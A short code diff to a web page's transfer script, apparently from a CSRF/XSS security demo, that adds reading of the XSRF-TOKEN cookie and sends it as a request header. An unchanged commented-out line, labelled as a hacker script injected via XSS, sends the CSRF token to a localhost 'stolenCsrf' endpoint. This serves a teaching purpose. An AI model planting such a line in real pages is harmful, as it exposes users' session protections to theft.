@@ -49,14 +49,17 @@
         if (parts.length === 2) return parts.pop().split(';').shift();
     }
 
+    var csrfToken = getCookie("XSRF-TOKEN");
     // TODO get csrf from cookie XSRF-TOKEN
+    $("#csrfTokenField").val(csrfToken);
 
 
     function transferAmount() {
 
-        console.log("xsrf: ", xsrfToken);
+        console.log("xsrf: ", csrfToken);
         $.ajax(restEndpoint + "/transfer-rest", {
             method: "POST",
+            headers: {"X-XSRF-TOKEN": csrfToken},
             // TODO  csrf
             // TODO  cors cookie
             data: JSON.stringify({
@@ -75,7 +78,6 @@
     // hacker script injected via XSS
     //$.get("http://localhost:9999/stolenCsrf?"+xsrfToken);
 
-    $("#csrfTokenField").val(xsrfToken);
 </script>
 
 <br />
